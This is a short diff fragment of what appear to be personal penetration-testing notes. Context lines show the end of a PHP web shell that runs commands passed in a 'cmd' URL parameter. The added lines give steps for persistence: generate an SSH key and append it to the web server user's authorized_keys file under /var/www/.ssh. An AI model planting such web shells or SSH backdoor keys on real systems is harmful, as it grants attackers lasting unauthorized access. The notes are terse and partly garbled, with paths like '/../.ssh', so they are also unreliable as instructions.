@@ -48,3 +48,23 @@ if($_GET['cmd']) {
 </pre>
 </BODY></HTML>
 
+
+SSH KEYGEN
+ssh-keygen -t rsa -b 4096 ( on lin-ops) in .ssh
+
+copy to user(whoami) home page /../.ssh
+echo "key" >> /../.ssh/authorized_keys  (/var/www/.ssh)
+cat to verify
+
+### verify locations and folders/files!!!
+ ls -la /users/home/directory      #check if .ssh exists
+ mkdir /users/home/directory/.ssh  (/var/www/.ssh)
+ 
+
+
+
+
+
+
+
+
